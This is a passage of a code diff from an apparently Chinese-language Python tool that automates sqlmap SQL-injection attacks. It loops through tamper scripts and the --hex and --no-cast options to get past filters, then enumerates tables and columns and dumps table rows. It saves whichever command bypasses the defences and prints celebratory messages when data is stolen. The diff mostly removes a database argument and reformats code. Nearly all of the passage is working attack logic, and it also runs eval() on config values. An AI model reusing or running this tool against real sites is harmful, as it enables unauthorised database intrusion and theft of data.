-                            if self.sm_no_cast_command_with_tamper + " --technique=USE" + " -D " + db_name + " --tables" in current_finished_command_list:
+                            if self.sm_no_cast_command_with_tamper + " --technique=USE" + " --tables" in current_finished_command_list:
                                 pass
                             else:
                                 self.output.os_system_with_bottom_status(self.sm_no_cast_command_with_tamper +
-                                          " --technique=USE" + " -D " + db_name + " --tables")
+                                                                         " --technique=USE" + " --tables")
                                 current_finished_command_list.append(
-                                    self.sm_no_cast_command_with_tamper + " --technique=USE" + " -D " + db_name + " --tables")
+                                    self.sm_no_cast_command_with_tamper + " --technique=USE" + " --tables")
                                 update_config_file_key_value(self.log_config_file, 'default',
                                                              'finished_command_list', current_finished_command_list)
 
-                                table_name= self.get_table_name_from_log_file(self.log_file)
-                                if table_name!= 0 and table_name!= "":
-                                    self.output.good_print("恭喜大爷!!! 使用当前tamper:%s和--no-cast选项获得了当前数据库的表名" % tamper_string,'red')
+                                table_name = self.get_table_name_from_log_file(self.log_file)
+                                if table_name != 0 and table_name != "":
+                                    self.output.good_print(
+                                        "恭喜大爷!!! 使用当前tamper:%s和--no-cast选项获得了当前数据库的表名" % tamper_string, 'red')
                                     flag = 1
                                     update_config_file_key_value(
                                         self.log_config_file, 'default', 'hex_or_no_cast', ['--no-cast'])
@@ -973,19 +1015,20 @@ class Program(object):
                         if flag == 0:
                             current_finished_command_list = eval(get_key_value_from_config_file(
                                 self.log_config_file, 'default', 'finished_command_list'))
-                            if self.sm_no_cast_command_with_tamper + " --technique=BQT" + " -D " + db_name + " --tables" in current_finished_command_list:
+                            if self.sm_no_cast_command_with_tamper + " --technique=BQT" + " --tables" in current_finished_command_list:
                                 pass
                             else:
                                 self.output.os_system_with_bottom_status(self.sm_no_cast_command_with_tamper +
-                                          " --technique=BQT" + " -D " + db_name + " --tables")
+                                                                         " --technique=BQT" + " --tables")
                                 current_finished_command_list.append(
-                                    self.sm_no_cast_command_with_tamper + " --technique=BQT" + " -D " + db_name + " --tables")
+                                    self.sm_no_cast_command_with_tamper + " --technique=BQT" + " --tables")
                                 update_config_file_key_value(self.log_config_file, 'default',
                                                              'finished_command_list', current_finished_command_list)
 
-                                table_name= self.get_table_name_from_log_file(self.log_file)
-                                if table_name!= 0 and table_name!= "":
-                                    self.output.good_print("恭喜大爷!!! 使用当前tamper:%s和--no-cast选项获得了当前数据库的表名" % tamper_string,'red')
+                                table_name = self.get_table_name_from_log_file(self.log_file)
+                                if table_name != 0 and table_name != "":
+                                    self.output.good_print(
+                                        "恭喜大爷!!! 使用当前tamper:%s和--no-cast选项获得了当前数据库的表名" % tamper_string, 'red')
                                     flag = 1
                                     update_config_file_key_value(
                                         self.log_config_file, 'default', 'hex_or_no_cast', ['--no-cast'])
@@ -1000,38 +1043,40 @@ class Program(object):
 
                     current_finished_command_list = eval(get_key_value_from_config_file(
                         self.log_config_file, 'default', 'finished_command_list'))
-                    if sm_hex_or_no_cast_command_with_tamper + " -D " + db_name + " --tables" in current_finished_command_list:
+                    if sm_hex_or_no_cast_command_with_tamper + " --tables" in current_finished_command_list:
                         pass
                     else:
-                        self.output.os_system_with_bottom_status(sm_hex_or_no_cast_command_with_tamper + " -D " + db_name + " --tables")
+                        self.output.os_system_with_bottom_status(
+                            sm_hex_or_no_cast_command_with_tamper + " --tables")
                         current_finished_command_list.append(
-                            sm_hex_or_no_cast_command_with_tamper + " -D " + db_name + " --tables")
+                            sm_hex_or_no_cast_command_with_tamper + " --tables")
                         update_config_file_key_value(self.log_config_file, 'default',
                                                      'finished_command_list', current_finished_command_list)
 
-                        table_name= self.get_table_name_from_log_file(self.log_file)
-                        if table_name!= 0 and table_name!= "":
+                        table_name = self.get_table_name_from_log_file(self.log_file)
+                        if table_name != 0 and table_name != "":
                             self.output.good_print("恭喜大爷!!! 使用当前tamper:%s和已经得到的%s选项获得了当前数据库的表名" %
-                                  (tamper_string, hex_or_no_cast),'red')
+                                                   (tamper_string, hex_or_no_cast), 'red')
                             flag = 1
 
                 if flag == 0:
                     sm_hex_or_no_cast_command_with_tamper = self.sm_command_with_tamper + " " + hex_or_no_cast + " --technique=BQT"
                     current_finished_command_list = eval(get_key_value_from_config_file(
                         self.log_config_file, 'default', 'finished_command_list'))
-                    if sm_hex_or_no_cast_command_with_tamper + " -D " + db_name + " --tables" in current_finished_command_list:
+                    if sm_hex_or_no_cast_command_with_tamper + " --tables" in current_finished_command_list:
                         pass
                     else:
-                        self.output.os_system_with_bottom_status(sm_hex_or_no_cast_command_with_tamper + " -D " + db_name + " --tables")
+                        self.output.os_system_with_bottom_status(
+                            sm_hex_or_no_cast_command_with_tamper + " --tables")
                         current_finished_command_list.append(
-                            sm_hex_or_no_cast_command_with_tamper + " -D " + db_name + " --tables")
+                            sm_hex_or_no_cast_command_with_tamper + " --tables")
                         update_config_file_key_value(self.log_config_file, 'default',
                                                      'finished_command_list', current_finished_command_list)
 
-                        table_name= self.get_table_name_from_log_file(self.log_file)
-                        if table_name!= 0 and table_name!= "":
+                        table_name = self.get_table_name_from_log_file(self.log_file)
+                        if table_name != 0 and table_name != "":
                             self.output.good_print("恭喜大爷!!! 使用当前tamper:%s和已经得到的%s选项获得了当前数据库的表名" %
-                                  (tamper_string, hex_or_no_cast),'red')
+                                                   (tamper_string, hex_or_no_cast), 'red')
                             flag = 1
 
             if flag == 1:
@@ -1056,8 +1101,8 @@ class Program(object):
         if forwhat == 'column_name':
             # 为了获取一个数据库的一个表的所有列名的值而运行的test_tamper_string
             flag = 0
-            self.output.good_print("现在尝试用tamper来获取当前数据库的表的列名...",'green')
-            self.output.good_print("目前使用的tamper是%s" % tamper_string,'green')
+            self.output.good_print("现在尝试用tamper来获取当前数据库的表的列名...", 'green')
+            self.output.good_print("目前使用的tamper是%s" % tamper_string, 'green')
             db_name = self.get_db_name_from_log_file(self.log_file)[0]
             table_name = self.get_table_name_from_log_file(self.log_file)
             if eval(get_key_value_from_config_file(self.log_config_file, 'default', 'hex_or_no_cast')) == []:
@@ -1065,58 +1110,59 @@ class Program(object):
                 if self.has_good_sqli_type == 1:
                     current_finished_command_list = eval(get_key_value_from_config_file(
                         self.log_config_file, 'default', 'finished_command_list'))
-                    if self.sm_command_with_tamper + " --technique=USE" + " -D " + db_name + " -T " + table_name + " --columns" in current_finished_command_list:
+                    if self.sm_command_with_tamper + " --technique=USE" + " -T " + table_name + " --columns" in current_finished_command_list:
                         pass
                     else:
                         self.output.os_system_with_bottom_status(self.sm_command_with_tamper + " --technique=USE" +
-                                  " -D " + db_name + " -T " + table_name + " --columns")
+                                                                 " -T " + table_name + " --columns")
                         current_finished_command_list.append(
-                            self.sm_command_with_tamper + " --technique=USE" + " -D " + db_name + " -T " + table_name + " --columns")
+                            self.sm_command_with_tamper + " --technique=USE" + " -T " + table_name + " --columns")
                         update_config_file_key_value(self.log_config_file, 'default',
                                                      'finished_command_list', current_finished_command_list)
 
                         has_column_name = self.get_column_name_from_log_file(self.log_file)
                         if has_column_name == 1:
                             self.output.good_print("恭喜大爷!!! 使用当前tamper:%s获得了当前数据库的表的列名" %
-                                    tamper_string,'red')
+                                                   tamper_string, 'red')
                             flag = 1
 
                 if flag == 0:
                     current_finished_command_list = eval(get_key_value_from_config_file(
                         self.log_config_file, 'default', 'finished_command_list'))
-                    if self.sm_command_with_tamper + " --technique=BQT" + " -D " + db_name + " -T " + table_name + " --columns" in current_finished_command_list:
+                    if self.sm_command_with_tamper + " --technique=BQT" + " -T " + table_name + " --columns" in current_finished_command_list:
                         pass
                     else:
                         self.output.os_system_with_bottom_status(self.sm_command_with_tamper + " --technique=BQT" +
-                                  " -D " + db_name + " -T " + table_name + " --columns")
+                                                                 " -T " + table_name + " --columns")
                         current_finished_command_list.append(
-                            self.sm_command_with_tamper + " --technique=BQT" + " -D " + db_name + " -T " + table_name + " --columns")
+                            self.sm_command_with_tamper + " --technique=BQT" + " -T " + table_name + " --columns")
                         update_config_file_key_value(self.log_config_file, 'default',
                                                      'finished_command_list', current_finished_command_list)
 
                         has_column_name = self.get_column_name_from_log_file(self.log_file)
                         if has_column_name == 1:
                             self.output.good_print("恭喜大爷!!! 使用当前tamper:%s获得了当前数据库的表的列名" %
-                                    tamper_string,'red')
+                                                   tamper_string, 'red')
                             flag = 1
 
                 if flag == 0:
                     if self.has_good_sqli_type == 1:
                         current_finished_command_list = eval(get_key_value_from_config_file(
                             self.log_config_file, 'default', 'finished_command_list'))
-                        if self.sm_hex_command_with_tamper + " --technique=USE" + " -D " + db_name + " -T " + table_name + " --columns" in current_finished_command_list:
+                        if self.sm_hex_command_with_tamper + " --technique=USE" + " -T " + table_name + " --columns" in current_finished_command_list:
                             pass
                         else:
                             self.output.os_system_with_bottom_status(self.sm_hex_command_with_tamper + " --technique=USE" +
-                                      " -D " + db_name + " -T " + table_name + " --columns")
+                                                                     " -T " + table_name + " --columns")
                             current_finished_command_list.append(
-                                self.sm_hex_command_with_tamper + " --technique=USE" + " -D " + db_name + " -T " + table_name + " --columns")
+                                self.sm_hex_command_with_tamper + " --technique=USE" + " -T " + table_name + " --columns")
                             update_config_file_key_value(self.log_config_file, 'default',
                                                          'finished_command_list', current_finished_command_list)
 
                             has_column_name = self.get_column_name_from_log_file(self.log_file)
                             if has_column_name == 1:
-                                self.output.good_print("恭喜大爷!!! 使用当前tamper:%s和--hex选项获得了当前数据库的表的列名" % tamper_string,'red')
+                                self.output.good_print(
+                                    "恭喜大爷!!! 使用当前tamper:%s和--hex选项获得了当前数据库的表的列名" % tamper_string, 'red')
                                 flag = 1
                                 update_config_file_key_value(self.log_config_file, 'default',
                                                              'hex_or_no_cast', ['--hex'])
@@ -1124,19 +1170,20 @@ class Program(object):
                     if flag == 0:
                         current_tamper_list = eval(get_key_value_from_config_file(
                             self.log_config_file, 'default', 'finished_command_list'))
-                        if self.sm_hex_command_with_tamper + " --technique=BQT" + " -D " + db_name + " -T " + table_name + " --columns" in current_finished_command_list:
+                        if self.sm_hex_command_with_tamper + " --technique=BQT" + " -T " + table_name + " --columns" in current_finished_command_list:
                             pass
                         else:
                             self.output.os_system_with_bottom_status(self.sm_hex_command_with_tamper + " --technique=BQT" +
-                                      " -D " + db_name + " -T " + table_name + " --columns")
+                                                                     " -T " + table_name + " --columns")
                             current_finished_command_list.append(
-                                self.sm_hex_command_with_tamper + " --technique=BQT" + " -D " + db_name + " -T " + table_name + " --columns")
+                                self.sm_hex_command_with_tamper + " --technique=BQT" + " -T " + table_name + " --columns")
                             update_config_file_key_value(self.log_config_file, 'default',
                                                          'finished_command_list', current_finished_command_list)
 
                             has_column_name = self.get_column_name_from_log_file(self.log_file)
                             if has_column_name == 1:
-                                self.output.good_print("恭喜大爷!!! 使用当前tamper:%s和--hex选项获得了当前数据库的表的列名" % tamper_string,'red')
+                                self.output.good_print(
+                                    "恭喜大爷!!! 使用当前tamper:%s和--hex选项获得了当前数据库的表的列名" % tamper_string, 'red')
                                 flag = 1
                                 update_config_file_key_value(self.log_config_file, 'default',
                                                              'hex_or_no_cast', ['--hex'])
@@ -1145,19 +1192,20 @@ class Program(object):
                         if self.has_good_sqli_type == 1:
                             current_finished_command_list = eval(get_key_value_from_config_file(
                                 self.log_config_file, 'default', 'finished_command_list'))
-                            if self.sm_no_cast_command_with_tamper + " --technique=USE" + " -D " + db_name + " -T " + table_name + " --columns" in current_finished_command_list:
+                            if self.sm_no_cast_command_with_tamper + " --technique=USE" + " -T " + table_name + " --columns" in current_finished_command_list:
                                 pass
                             else:
                                 self.output.os_system_with_bottom_status(self.sm_no_cast_command_with_tamper + " --technique=USE" +
-                                          " -D " + db_name + " -T " + table_name + " --columns")
+                                                                         " -T " + table_name + " --columns")
                                 current_finished_command_list.append(
-                                    self.sm_no_cast_command_with_tamper + " --technique=USE" + " -D " + db_name + " -T " + table_name + " --columns")
+                                    self.sm_no_cast_command_with_tamper + " --technique=USE" + " -T " + table_name + " --columns")
                                 update_config_file_key_value(self.log_config_file, 'default',
                                                              'finished_command_list', current_finished_command_list)
 
                                 has_column_name = self.get_column_name_from_log_file(self.log_file)
                                 if has_column_name == 1:
-                                    self.output.good_print("恭喜大爷!!! 使用当前tamper:%s和--no-cast选项获得了当前数据库的表的列名" % tamper_string,'red')
+                                    self.output.good_print(
+                                        "恭喜大爷!!! 使用当前tamper:%s和--no-cast选项获得了当前数据库的表的列名" % tamper_string, 'red')
                                     flag = 1
                                     update_config_file_key_value(
                                         self.log_config_file, 'default', 'hex_or_no_cast', ['--no-cast'])
@@ -1165,19 +1213,20 @@ class Program(object):
                         if flag == 0:
                             current_finished_command_list = eval(get_key_value_from_config_file(
                                 self.log_config_file, 'default', 'finished_command_list'))
-                            if self.sm_no_cast_command_with_tamper + " --technique=BQT" + " -D " + db_name + " -T " + table_name + " --columns" in current_finished_command_list:
+                            if self.sm_no_cast_command_with_tamper + " --technique=BQT" + " -T " + table_name + " --columns" in current_finished_command_list:
                                 pass
                             else:
                                 self.output.os_system_with_bottom_status(self.sm_no_cast_command_with_tamper + " --technique=BQT" +
-                                          " -D " + db_name + " -T " + table_name + " --columns")
+                                                                         " -T " + table_name + " --columns")
                                 current_finished_command_list.append(
-                                    self.sm_no_cast_command_with_tamper + " --technique=BQT" + " -D " + db_name + " -T " + table_name + " --columns")
+                                    self.sm_no_cast_command_with_tamper + " --technique=BQT" + " -T " + table_name + " --columns")
                                 update_config_file_key_value(self.log_config_file, 'default',
                                                              'finished_command_list', current_finished_command_list)
 
                                 has_column_name = self.get_column_name_from_log_file(self.log_file)
                                 if has_column_name == 1:
-                                    self.output.good_print("恭喜大爷!!! 使用当前tamper:%s和--no-cast选项获得了当前数据库的表的列名" % tamper_string,'red')
+                                    self.output.good_print(
+                                        "恭喜大爷!!! 使用当前tamper:%s和--no-cast选项获得了当前数据库的表的列名" % tamper_string, 'red')
                                     flag = 1
                                     update_config_file_key_value(
                                         self.log_config_file, 'default', 'hex_or_no_cast', ['--no-cast'])
@@ -1192,40 +1241,40 @@ class Program(object):
 
                     current_finished_command_list = eval(get_key_value_from_config_file(
                         self.log_config_file, 'default', 'finished_command_list'))
-                    if sm_hex_or_no_cast_command_with_tamper + " -D " + db_name + " -T " + table_name + " --columns" in current_finished_command_list:
+                    if sm_hex_or_no_cast_command_with_tamper + " -T " + table_name + " --columns" in current_finished_command_list:
                         pass
                     else:
-                        self.output.os_system_with_bottom_status(sm_hex_or_no_cast_command_with_tamper + " -D " +
-                                  db_name + " -T " + table_name + " --columns")
+                        self.output.os_system_with_bottom_status(sm_hex_or_no_cast_command_with_tamper + 
+                                                                 " -T " + table_name + " --columns")
                         current_finished_command_list.append(
-                            sm_hex_or_no_cast_command_with_tamper + " -D " + db_name + " -T " + table_name + " --columns")
+                            sm_hex_or_no_cast_command_with_tamper + " -T " + table_name + " --columns")
                         update_config_file_key_value(self.log_config_file, 'default',
                                                      'finished_command_list', current_finished_command_list)
 
                         has_column_name = self.get_column_name_from_log_file(self.log_file)
                         if has_column_name == 1:
                             self.output.good_print("恭喜大爷!!! 使用当前tamper:%s和已经得到的%s选项获得了当前数据库的表的列名" %
-                                  (tamper_string, hex_or_no_cast),'red')
+                                                   (tamper_string, hex_or_no_cast), 'red')
                             flag = 1
 
                 if flag == 0:
                     sm_hex_or_no_cast_command_with_tamper = self.sm_command_with_tamper + " " + hex_or_no_cast + " --technique=BQT"
                     current_finished_command_list = eval(get_key_value_from_config_file(
                         self.log_config_file, 'default', 'finished_command_list'))
-                    if sm_hex_or_no_cast_command_with_tamper + " -D " + db_name + " -T " + table_name + " --columns" in current_finished_command_list:
+                    if sm_hex_or_no_cast_command_with_tamper + " -T " + table_name + " --columns" in current_finished_command_list:
                         pass
                     else:
-                        self.output.os_system_with_bottom_status(sm_hex_or_no_cast_command_with_tamper + " -D " +
-                                  db_name + " -T " + table_name + " --columns")
+                        self.output.os_system_with_bottom_status(sm_hex_or_no_cast_command_with_tamper + 
+                                                                 " -T " + table_name + " --columns")
                         current_finished_command_list.append(
-                            sm_hex_or_no_cast_command_with_tamper + " -D " + db_name + " -T " + table_name + " --columns")
+                            sm_hex_or_no_cast_command_with_tamper + " -T " + table_name + " --columns")
                         update_config_file_key_value(self.log_config_file, 'default',
                                                      'finished_command_list', current_finished_command_list)
 
                         has_column_name = self.get_column_name_from_log_file(self.log_file)
                         if has_column_name == 1:
                             self.output.good_print("恭喜大爷!!! 使用当前tamper:%s和已经得到的%s选项获得了当前数据库的表的列名" %
-                                  (tamper_string, hex_or_no_cast),'red')
+                                                   (tamper_string, hex_or_no_cast), 'red')
                             flag = 1
 
             if flag == 1:
@@ -1250,8 +1299,8 @@ class Program(object):
         if forwhat == 'entries':
             # 为了获取一个数据库的一个表的所有列的所有具体内容[一个表的具体数据]而运行的test_tamper_string
             flag = 0
-            self.output.good_print("现在尝试用tamper来获取当前数据库的表的列名的具体数据...",'green')
-            self.output.good_print("目前使用的tamper是%s" % tamper_string,'green')
+            self.output.good_print("现在尝试用tamper来获取当前数据库的表的列名的具体数据...", 'green')
+            self.output.good_print("目前使用的tamper是%s" % tamper_string, 'green')
             db_name = self.get_db_name_from_log_file(self.log_file)[0]
             table_name = self.get_table_name_from_log_file(self.log_file)
             if eval(get_key_value_from_config_file(self.log_config_file, 'default', 'hex_or_no_cast')) == []:
@@ -1259,62 +1308,65 @@ class Program(object):
                 if self.has_good_sqli_type == 1:
                     current_finished_command_list = eval(get_key_value_from_config_file(
                         self.log_config_file, 'default', 'finished_command_list'))
-                    if self.sm_command_with_tamper + " --technique=USE" + " -D " + db_name + " -T " + table_name + " --dump --stop 3" in current_finished_command_list:
+                    if self.sm_command_with_tamper + " --technique=USE" + " -T " + table_name + " --dump --stop 3" in current_finished_command_list:
                         pass
                     else:
-                        self.output.os_system_with_bottom_status(self.sm_command_with_tamper + " --technique=USE" + " -D " +
-                                  db_name + " -T " + table_name + " --dump --stop 3")
+                        self.output.os_system_with_bottom_status(self.sm_command_with_tamper + " --technique=USE" + 
+                                                                 " -T " + table_name + " --dump --stop 3")
                         current_finished_command_list.append(
-                            self.sm_command_with_tamper + " --technique=USE" + " -D " + db_name + " -T " + table_name + " --dump --stop 3")
+                            self.sm_command_with_tamper + " --technique=USE" + " -T " + table_name + " --dump --stop 3")
                         update_config_file_key_value(self.log_config_file, 'default',
                                                      'finished_command_list', current_finished_command_list)
 
                         has_entries = self.get_entries_from_log_file(self.log_file)
                         if has_entries == 1:
                             update_config_file_key_value(self.log_config_file, 'default', 'bypassed_command', [
-                                                         self.sm_command_with_tamper + " --technique=USE" + " -D " + db_name + " -T " + table_name + " --dump --stop 3"])
-                            self.output.good_print("恭喜大爷!!! 使用当前tamper:%s获得了当前数据库的表的列名的具体数据" % tamper_string,'red')
+                                                         self.sm_command_with_tamper + " --technique=USE" + " -T " + table_name + " --dump --stop 3"])
+                            self.output.good_print(
+                                "恭喜大爷!!! 使用当前tamper:%s获得了当前数据库的表的列名的具体数据" % tamper_string, 'red')
                             flag = 1
 
                 if flag == 0:
                     current_finished_command_list = eval(get_key_value_from_config_file(
                         self.log_config_file, 'default', 'finished_command_list'))
-                    if self.sm_command_with_tamper + " --technique=BQT" + " -D " + db_name + " -T " + table_name + " --dump --stop 3" in current_finished_command_list:
+                    if self.sm_command_with_tamper + " --technique=BQT" + " -T " + table_name + " --dump --stop 3" in current_finished_command_list:
                         pass
                     else:
-                        self.output.os_system_with_bottom_status(self.sm_command_with_tamper + " --technique=BQT" + " -D " +
-                                  db_name + " -T " + table_name + " --dump --stop 3")
+                        self.output.os_system_with_bottom_status(self.sm_command_with_tamper + " --technique=BQT" + 
+                                                                 " -T " + table_name + " --dump --stop 3")
                         current_finished_command_list.append(
-                            self.sm_command_with_tamper + " --technique=BQT" + " -D " + db_name + " -T " + table_name + " --dump --stop 3")
+                            self.sm_command_with_tamper + " --technique=BQT" + " -T " + table_name + " --dump --stop 3")
                         update_config_file_key_value(self.log_config_file, 'default',
                                                      'finished_command_list', current_finished_command_list)
 
                         has_entries = self.get_entries_from_log_file(self.log_file)
                         if has_entries == 1:
                             update_config_file_key_value(self.log_config_file, 'default', 'bypassed_command', [
-                                                         self.sm_command_with_tamper + " --technique=BQT" + " -D " + db_name + " -T " + table_name + " --dump --stop 3"])
-                            self.output.good_print("恭喜大爷!!! 使用当前tamper:%s获得了当前数据库的表的列名的具体数据" % tamper_string,'red')
+                                                         self.sm_command_with_tamper + " --technique=BQT" + " -T " + table_name + " --dump --stop 3"])
+                            self.output.good_print(
+                                "恭喜大爷!!! 使用当前tamper:%s获得了当前数据库的表的列名的具体数据" % tamper_string, 'red')
                             flag = 1
 
                 if flag == 0:
                     if self.has_good_sqli_type == 1:
                         current_finished_command_list = eval(get_key_value_from_config_file(
                             self.log_config_file, 'default', 'finished_command_list'))
-                        if self.sm_hex_command_with_tamper + " --technique=USE" + " -D " + db_name + " -T " + table_name + " --dump --stop 3" in current_finished_command_list:
+                        if self.sm_hex_command_with_tamper + " --technique=USE" + " -T " + table_name + " --dump --stop 3" in current_finished_command_list:
                             pass
                         else:
-                            self.output.os_system_with_bottom_status(self.sm_hex_command_with_tamper + " --technique=USE" + " -D " +
-                                      db_name + " -T " + table_name + " --dump --stop 3")
+                            self.output.os_system_with_bottom_status(self.sm_hex_command_with_tamper + " --technique=USE" + 
+                                                                     " -T " + table_name + " --dump --stop 3")
                             current_finished_command_list.append(
-                                self.sm_hex_command_with_tamper + " --technique=USE" + " -D " + db_name + " -T " + table_name + " --dump --stop 3")
+                                self.sm_hex_command_with_tamper + " --technique=USE" + " -T " + table_name + " --dump --stop 3")
                             update_config_file_key_value(self.log_config_file, 'default',
                                                          'finished_command_list', current_finished_command_list)
 
                             has_entries = self.get_entries_from_log_file(self.log_file)
                             if has_entries == 1:
                                 update_config_file_key_value(self.log_config_file, 'default', 'bypassed_command', [
-                                                             self.sm_hex_command_with_tamper + " --technique=USE" + " -D " + db_name + " -T " + table_name + " --dump --stop 3"])
-                                self.output.good_print("恭喜大爷!!! 使用当前tamper:%s和--hex选项获得了当前数据库的表的列名的具体数据" % tamper_string,'red')
+                                                             self.sm_hex_command_with_tamper + " --technique=USE" + " -T " + table_name + " --dump --stop 3"])
+                                self.output.good_print(
+                                    "恭喜大爷!!! 使用当前tamper:%s和--hex选项获得了当前数据库的表的列名的具体数据" % tamper_string, 'red')
                                 flag = 1
                                 update_config_file_key_value(self.log_config_file, 'default',
                                                              'hex_or_no_cast', ['--hex'])
@@ -1322,21 +1374,22 @@ class Program(object):
                     if flag == 0:
                         current_finished_command_list = eval(get_key_value_from_config_file(
                             self.log_config_file, 'default', 'finished_command_list'))
-                        if self.sm_hex_command_with_tamper + " --technique=BQT" + " -D " + db_name + " -T " + table_name + " --dump --stop 3" in current_finished_command_list:
+                        if self.sm_hex_command_with_tamper + " --technique=BQT" + " -T " + table_name + " --dump --stop 3" in current_finished_command_list:
                             pass
                         else:
-                            self.output.os_system_with_bottom_status(self.sm_hex_command_with_tamper + " --technique=BQT" + " -D " +
-                                      db_name + " -T " + table_name + " --dump --stop 3")
+                            self.output.os_system_with_bottom_status(self.sm_hex_command_with_tamper + " --technique=BQT" + 
+                                                                     " -T " + table_name + " --dump --stop 3")
                             current_finished_command_list.append(
-                                self.sm_hex_command_with_tamper + " --technique=BQT" + " -D " + db_name + " -T " + table_name + " --dump --stop 3")
+                                self.sm_hex_command_with_tamper + " --technique=BQT" + " -T " + table_name + " --dump --stop 3")
                             update_config_file_key_value(self.log_config_file, 'default',
                                                          'finished_command_list', current_finished_command_list)
 
                             has_entries = self.get_entries_from_log_file(self.log_file)
                             if has_entries == 1:
                                 update_config_file_key_value(self.log_config_file, 'default', 'bypassed_command', [
-                                                             self.sm_hex_command_with_tamper + " --technique=BQT" + " -D " + db_name + " -T " + table_name + " --dump --stop 3"])
-                                self.output.good_print("恭喜大爷!!! 使用当前tamper:%s和--hex选项获得了当前数据库的表的列名的具体数据" % tamper_string,'red')
+                                                             self.sm_hex_command_with_tamper + " --technique=BQT" + " -T " + table_name + " --dump --stop 3"])
+                                self.output.good_print(
+                                    "恭喜大爷!!! 使用当前tamper:%s和--hex选项获得了当前数据库的表的列名的具体数据" % tamper_string, 'red')
                                 flag = 1
                                 update_config_file_key_value(self.log_config_file, 'default',
                                                              'hex_or_no_cast', ['--hex'])
@@ -1345,21 +1398,22 @@ class Program(object):
                         if self.has_good_sqli_type == 1:
                             current_finished_command_list = eval(get_key_value_from_config_file(
                                 self.log_config_file, 'default', 'finished_command_list'))
-                            if self.sm_no_cast_command_with_tamper + " --technique=USE" + " -D " + db_name + " -T " + table_name + " --dump --stop 3" in current_finished_command_list:
+                            if self.sm_no_cast_command_with_tamper + " --technique=USE" + " -T " + table_name + " --dump --stop 3" in current_finished_command_list:
                                 pass
                             else:
                                 self.output.os_system_with_bottom_status(self.sm_no_cast_command_with_tamper + " --technique=USE" +
-                                          " -D " + db_name + " -T " + table_name + " --dump --stop 3")
+                                                                         " -T " + table_name + " --dump --stop 3")
                                 current_finished_command_list.append(
-                                    self.sm_no_cast_command_with_tamper + " --technique=USE" + " -D " + db_name + " -T " + table_name + " --dump --stop 3")
+                                    self.sm_no_cast_command_with_tamper + " --technique=USE" + " -T " + table_name + " --dump --stop 3")
                                 update_config_file_key_value(self.log_config_file, 'default',
                                                              'finished_command_list', current_finished_command_list)
 
                                 has_entries = self.get_entries_from_log_file(self.log_file)
                                 if has_entries == 1:
                                     update_config_file_key_value(self.log_config_file, 'default', 'bypassed_command', [
-                                                                 self.sm_no_cast_command_with_tamper + " --technique=USE" + " -D " + db_name + " -T " + table_name + " --dump --stop 3"])
-                                    self.output.good_print("恭喜大爷!!! 使用当前tamper:%s和--no-cast选项获得了当前数据库的表的列名的具体数据" % tamper_string,'red')
+                                                                 self.sm_no_cast_command_with_tamper + " --technique=USE" + " -T " + table_name + " --dump --stop 3"])
+                                    self.output.good_print(
+                                        "恭喜大爷!!! 使用当前tamper:%s和--no-cast选项获得了当前数据库的表的列名的具体数据" % tamper_string, 'red')
                                     flag = 1
                                     update_config_file_key_value(
                                         self.log_config_file, 'default', 'hex_or_no_cast', ['--no-cast'])
@@ -1367,21 +1421,22 @@ class Program(object):
                         if flag == 0:
                             current_finished_command_list = eval(get_key_value_from_config_file(
                                 self.log_config_file, 'default', 'finished_command_list'))
-                            if self.sm_no_cast_command_with_tamper + " --technique=BQT" + " -D " + db_name + " -T " + table_name + " --dump --stop 3" in current_finished_command_list:
+                            if self.sm_no_cast_command_with_tamper + " --technique=BQT" + " -T " + table_name + " --dump --stop 3" in current_finished_command_list:
                                 pass
                             else:
                                 self.output.os_system_with_bottom_status(self.sm_no_cast_command_with_tamper + " --technique=BQT" +
-                                          " -D " + db_name + " -T " + table_name + " --dump --stop 3")
+                                                                         " -T " + table_name + " --dump --stop 3")
                                 current_finished_command_list.append(
-                                    self.sm_no_cast_command_with_tamper + " --technique=BQT" + " -D " + db_name + " -T " + table_name + " --dump --stop 3")
+                                    self.sm_no_cast_command_with_tamper + " --technique=BQT" + " -T " + table_name + " --dump --stop 3")
                                 update_config_file_key_value(self.log_config_file, 'default',
                                                              'finished_command_list', current_finished_command_list)
 
                                 has_entries = self.get_entries_from_log_file(self.log_file)
                                 if has_entries == 1:
                                     update_config_file_key_value(self.log_config_file, 'default', 'bypassed_command', [
-                                                                 self.sm_no_cast_command_with_tamper + " --technique=BQT" + " -D " + db_name + " -T " + table_name + " --dump --stop 3"])
-                                    self.output.good_print("恭喜大爷!!! 使用当前tamper:%s和--no-cast选项获得了当前数据库的表的列名的具体数据" % tamper_string,'red')
+                                                                 self.sm_no_cast_command_with_tamper + " --technique=BQT" + " -T " + table_name + " --dump --stop 3"])
+                                    self.output.good_print(
+                                        "恭喜大爷!!! 使用当前tamper:%s和--no-cast选项获得了当前数据库的表的列名的具体数据" % tamper_string, 'red')
                                     flag = 1
                                     update_config_file_key_value(
                                         self.log_config_file, 'default', 'hex_or_no_cast', ['--no-cast'])
@@ -1396,44 +1451,44 @@ class Program(object):
 
                     current_finished_command_list = eval(get_key_value_from_config_file(
                         self.log_config_file, 'default', 'finished_command_list'))
-                    if sm_hex_or_no_cast_command_with_tamper + " -D " + db_name + " -T " + table_name + " --dump --stop 3" in current_finished_command_list:
+                    if sm_hex_or_no_cast_command_with_tamper + " -T " + table_name + " --dump --stop 3" in current_finished_command_list:
                         pass
                     else:
-                        self.output.os_system_with_bottom_status(sm_hex_or_no_cast_command_with_tamper + " -D " +
-                                  db_name + " -T " + table_name + " --dump --stop 3")
+                        self.output.os_system_with_bottom_status(sm_hex_or_no_cast_command_with_tamper + 
+                                                                 " -T " + table_name + " --dump --stop 3")
                         current_finished_command_list.append(
-                            sm_hex_or_no_cast_command_with_tamper + " -D " + db_name + " -T " + table_name + " --dump --stop 3")
+                            sm_hex_or_no_cast_command_with_tamper + " -T " + table_name + " --dump --stop 3")
                         update_config_file_key_value(self.log_config_file, 'default',
                                                      'finished_command_list', current_finished_command_list)
 
                         has_entries = self.get_entries_from_log_file(self.log_file)
                         if has_entries == 1:
                             update_config_file_key_value(self.log_config_file, 'default', 'bypassed_command', [
-                                                         sm_hex_or_no_cast_command_with_tamper + " -D " + db_name + " -T " + table_name + " --dump --stop 3"])
+                                                         sm_hex_or_no_cast_command_with_tamper + " -T " + table_name + " --dump --stop 3"])
                             self.output.good_print("恭喜大爷!!! 使用当前tamper:%s和已经得到的%s选项获得了当前数据库的表的列名的具体数据" %
-                                  (tamper_string, hex_or_no_cast),'red')
+                                                   (tamper_string, hex_or_no_cast), 'red')
                             flag = 1
 
                 if flag == 0:
                     sm_hex_or_no_cast_command_with_tamper = self.sm_command_with_tamper + " " + hex_or_no_cast + " --technique=BQT"
                     current_finished_command_list = eval(get_key_value_from_config_file(
